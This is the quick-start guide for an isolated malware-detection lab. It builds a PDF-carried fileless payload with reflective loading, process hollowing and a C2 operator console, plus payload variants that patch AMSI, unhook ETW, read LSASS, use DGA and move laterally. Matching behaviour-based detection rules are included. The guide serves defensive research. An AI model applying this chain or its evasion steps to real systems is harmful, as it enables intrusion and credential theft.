================================================================================
PHANTOM-X :: WINDOWS 11 PRO -- QUICK START
================================================================================
    Research lab for the chain:
        PDF -> embedded PE -> in-memory mapping -> execution -> C2
    Runs on a personally owned, isolated Windows 11 Pro VM.

    Read this file once, then follow the steps in order.


--------------------------------------------------------------------------------
STEP 0 -- ISOLATE THE VM (BEFORE ANYTHING ELSE)
--------------------------------------------------------------------------------
    The payload runs arbitrary commands inside the VM. The network lockdown
    is the control that contains that risk, so it goes in BEFORE the payload
    is on the machine. Locking it down afterwards is a statement of intent;
    locking it down first is a control.

    ON THE HOST (the machine that runs the C2):

        cd phantom-x\phase0_labnet
        .\setup_labnet.ps1 -Action apply -LabSubnet 192.168.77.0/24 -C2Port 9001

    ON THE VM:

        cd C:\pxvm\phase0_labnet
        .\setup_vm_labnet.ps1 -LabGateway 192.168.77.1 -C2Port 9001
        .\verify_labnet.ps1 -LabGateway 192.168.77.1 -C2Port 9001

    The verification must report PASS on all four checks. If HOME-1 or
    HOME-2 passes (meaning the home network IS reachable), stop and fix it
    before going further.

    NOTE: the VM will have NO INTERNET afterwards. That is deliberate.
    Install anything you need from the host, over the lab segment, first.


--------------------------------------------------------------------------------
STEP 1 -- HOST: build everything
--------------------------------------------------------------------------------
    cd phantom-x\phase3_fileless\loader
    .\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001

    Builds:
        px_payload.exe   freestanding C, reflectively loadable
        px_loader.exe    C, PDF extractor + reflective PE mapper
        px_hollow.exe    C, PDF extractor + remote process mapper
        px_c2.exe        Go, the lab C2 server
        px_pdfscan.exe   Rust, the independent PDF scanner
        px_detect.exe    Rust, the detection rule generator
        px_attack_chain.pdf  the carrier PDF

    It also runs the payload's formatter self-test. If that reports FAIL,
    stop: a formatter bug shows up as a wrong exit code at the far end of
    a C2 session, which is a long way from the cause.

    COPY C:\pxvm\ TO THE VM:  px_loader.exe, px_payload.exe, px_hollow.exe,
    px_attack_chain.pdf, the .ps1 scripts, px_c2.exe, px_pdfscan.exe,
    px_detect.exe.


--------------------------------------------------------------------------------
STEP 2 -- HOST: start the C2
--------------------------------------------------------------------------------
    cd phantom-x\phase5_network
    ..\dist\native\px_c2.exe --host 192.168.77.1 --port 9001 --log c2_audit.jsonl

    Bind to the LAB address (192.168.77.1), not 0.0.0.0. The host firewall
    rules from step 0 already block everything else from the lab subnet,
    but binding to the specific interface is the first line of defence.

    LEAVE THIS TERMINAL OPEN. It is the operator console.

    Commands:
        list                 show sessions
        exec 1 whoami        run a command in session 1
        exec all ver         run a command in every session
        ping 1               measure round trip latency
        kill 1               terminate a session cleanly
        stats                counters and audit log path
        quit                 stop the server


--------------------------------------------------------------------------------
STEP 3 -- VM: prepare
--------------------------------------------------------------------------------
    cd C:\pxvm\phase4_defender
    .\vm_prepare.ps1 -LabFolder C:\pxvm -LabGateway 192.168.77.1 -C2Port 9001

    It does, in order:
      1. network lockdown (unless -SkipNetwork)
      2. reports the Defender posture -- it does NOT change it
      3. removes Mark-of-the-Web from the lab files
      4. creates the report directories
      5. checks that Sysmon is installed

    If it reports that Tamper Protection is ON, note it: the Defender A/B
    toggle cannot change settings while it is on, so turn it off in
    Windows Security before you need the A/B.


--------------------------------------------------------------------------------
STEP 4 -- VM: can the VM reach the C2?
--------------------------------------------------------------------------------
    In an elevated PowerShell on the VM:

        Test-NetConnection -ComputerName 192.168.77.1 -Port 9001

    Expect: TcpTestSucceeded : True
    If False -> the VM's NIC is not on the host-only segment. Fix it in the
    hypervisor (VMware: VMnet1 = Host-only; Hyper-V: attach to PX-LAB).


--------------------------------------------------------------------------------
STEP 5 -- VM: capture the BEFORE state
--------------------------------------------------------------------------------
    cd C:\pxvm
    .\collect_defender.ps1 -Label before_chain

    STOP CONDITION: open reports\before_chain_defender_status.json and confirm
    "RealTimeProtectionEnabled": true
    If it is false -> fix it before continuing. Everything the report claims
    about Defender depends on it being on.


--------------------------------------------------------------------------------
STEP 6 -- VM: run the chain
--------------------------------------------------------------------------------
    cd C:\pxvm
    $env:PX_C2_HOST = "192.168.77.1"
    $env:PX_C2_PORT = "9001"
    .\px_loader.exe .\px_attack_chain.pdf .\loader.log

    The terminal will appear to hang. THAT IS CORRECT -- the payload is
    running in a loop. Leave it.

    Expected in loader.log:
        [loader] embedded file: inflated bytes (encoded flate)
        [loader] PE: machine=0x8664 ...

    The HOST console should now show:
        [+] session 1 connected from 192.168.77.x
        [*] session 1 hello: host=... arch=x64 pid=...

    Try:
        exec 1 whoami
        exec 1 cmd /c echo PHANTOM_X_CHAIN_PROOF

    The exit code should be a NUMBER (0), not the text "%ld". If you see
    "%ld", the payload is a stale binary -- rebuild it.


--------------------------------------------------------------------------------
STEP 7 -- VM: capture the AFTER state
--------------------------------------------------------------------------------
    .\collect_defender.ps1 -Label after_chain

    Then, if you want the documented coverage gap:
        .\lab_ab_toggle.ps1 -Action off
        # ... run the chain again ...
        .\lab_ab_toggle.ps1 -Action on

    The toggle arms a restore guard before it changes anything, so the VM
    cannot be left unprotected even if the process is killed.


--------------------------------------------------------------------------------
STEP 8 -- CROSS-VALIDATE (on the host)
--------------------------------------------------------------------------------
    python3 phase1_pdf/validate_cross_impl.py \
        --rust dist/native/px_pdfscan.exe --samples phase1_pdf/samples

    python3 phase5_network/validate_c2_equivalence.py \
        --go dist/native/px_c2.exe

    Both must report PASS. They compare two independent implementations of
    the same thing, which is how the bugs that have already been found in
    this codebase were found at all.


--------------------------------------------------------------------------------
STEP 9 -- THE VARIANT MATRIX
--------------------------------------------------------------------------------
    The baseline payload is plain. That is the COMPARISON arm: it produces
    the clean telemetry that everything else is measured against.

    The variant builds add one capability each, so that you can see what
    changes in what the endpoint sees:

        cd phase3_fileless\loader
        .\build_variants.ps1 -C2Host <KALI-IP> -C2Port 9001

    Produces nine binaries in dist\variants\:

        px_payload_baseline.exe    plain -- the comparison arm
        px_payload_obfuscate.exe   strings encoded, not in the binary
        px_payload_amsi.exe        AMSI patched
        px_payload_etw.exe         ETW unhooked
        px_payload_encrypt.exe     encrypted C2 channel
        px_payload_dga.exe         generated hostname
        px_payload_cred.exe        credential access
        px_payload_lateral.exe     lateral movement
        px_payload_full.exe        everything at once

    Copy the one you are testing to the VM and run it the same way as the
    baseline. Then COMPARE: which Sysmon events still fire, which Defender
    alerts still fire, which network rules still fire. A rule that only
    fires on the baseline arm was riding on something the variant removed,
    and that is a finding about the RULE.

    The DGA arm needs the lab DNS helper running on the HOST:

        cd phase5_network
        python3 dga_dns.py --host <LAB-HOST-IP> --port 53 \
            --c2 <LAB-HOST-IP> --prefix pxlab --tld .lab.test

    and the VM's DNS pointed at the lab gateway.


--------------------------------------------------------------------------------
STEP 10 -- WHAT THE DETECTOR SEES
--------------------------------------------------------------------------------
    On the HOST:

        dist\native\px_detect.exe --list
        dist\native\px_detect.exe --explain px-003
        dist\native\px_detect.exe --emit sigma > detections.yml

    There are fourteen rules. Six of them are the detections for the
    variant arms:

        px-009  credential access -- LSASS handle with VM_READ
        px-010  lateral movement -- remote service created over SMB
        px-011  encrypted channel -- the traffic's shape, not its content
        px-012  domain generation -- the DNS query pattern
        px-013  AMSI or ETW unhooking -- writable+executable page
        px-014  obfuscated binary -- shape rather than strings

    px-013 is the important one: it catches the unhooking arms WITHOUT
    relying on ETW being intact. A detection that needs the mechanism it
    is detecting is not a detection.

    The rules key on BEHAVIOUR rather than on strings, so they keep
    working on the obfuscated arm.


================================================================================
WHAT IS NOT IN THIS LAB, AND WHY
================================================================================
    No persistence. The payload never writes itself anywhere that survives
    it. No privilege escalation. The payload only ever affects its own
    process.

    Credential access collects but does not send the secret material to
    the C2 server. Your C2 is a plain TCP listener; if it is reachable,
    a payload that ships real credentials there has published them to
    whoever can reach that address too. The detection question is answered
    by the ACCESS -- the handle to lsass.exe, the memory reads -- not by
    the contents, so the redacted report is a complete measurement.

    Lateral movement moves to ONE explicitly named host, which you supply.
    No scanning, no target list, no propagation. A self-moving payload is
    a worm, and a worm on a lab segment reaches every lab host the moment
    you forget to clean up, at which point the telemetry stops being
    repeatable.

    On "send a PDF to someone and their machine runs it": that requires
    code on the RECIPIENT's machine (a file-association handler, or a
    reader that honours /Launch, which Acrobat disabled in 2018 and Edge
    never honoured). It is not something a sender can do on their own. The
    lab measures what happens on a machine you control, which is both
    possible and scientifically valid.
